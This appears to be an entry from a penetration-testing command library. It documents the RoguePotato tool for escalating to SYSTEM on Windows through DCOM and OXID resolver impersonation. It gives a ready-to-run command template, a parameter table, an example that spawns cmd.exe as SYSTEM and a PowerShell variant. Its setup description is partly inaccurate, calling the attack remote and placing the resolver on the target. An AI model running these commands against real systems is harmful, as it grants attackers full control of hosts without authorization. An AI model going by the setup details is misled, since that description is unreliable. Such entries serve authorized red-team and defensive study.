---
id: new-uuid-2
name: roguepotato-remote-execution-basic
type: command
executor: cmd
data: RoguePotato.exe -r $_TARGET_IP -e "$_EXECUTABLE"
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - priv-esc
  - dcom
  - roguepotato
verified: true
validated: true
---

# roguepotato-remote-execution-basic

## Command

```cmd
RoguePotato.exe -r $_TARGET_IP -e "$_EXECUTABLE"
```

## Description

This command uses RoguePotato to perform remote privilege escalation by connecting to the target's DCOM port 135 (assumed forwarded) and executing a specified command as SYSTEM via OXID resolver impersonation. It requires RogueOxidResolver running on the target for this basic mode.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -r $_TARGET_IP | IP address of the remote target | Yes |
| -e "$_EXECUTABLE" | Path to the executable or command to run as SYSTEM (e.g., "C:\windows\system32\cmd.exe") | Yes |

## Examples

### Basic Usage

```cmd
RoguePotato.exe -r 10.0.0.5 -e "C:\windows\system32\cmd.exe"
```

### Advanced Usage

Execute PowerShell: RoguePotato.exe -r $_TARGET_IP -e "powershell.exe -c Get-Process"

## Expected Output

Upon success, RoguePotato logs 'Impersonation successful' or similar, and the specified executable runs as SYSTEM on the target. Output may include the command's stdout if interactive; check target processes for new SYSTEM-owned cmd.exe.

## Related

- [[procedures/Rogue-Potato-Impersonation-Privileges]]
- [[tools/roguepotato]]
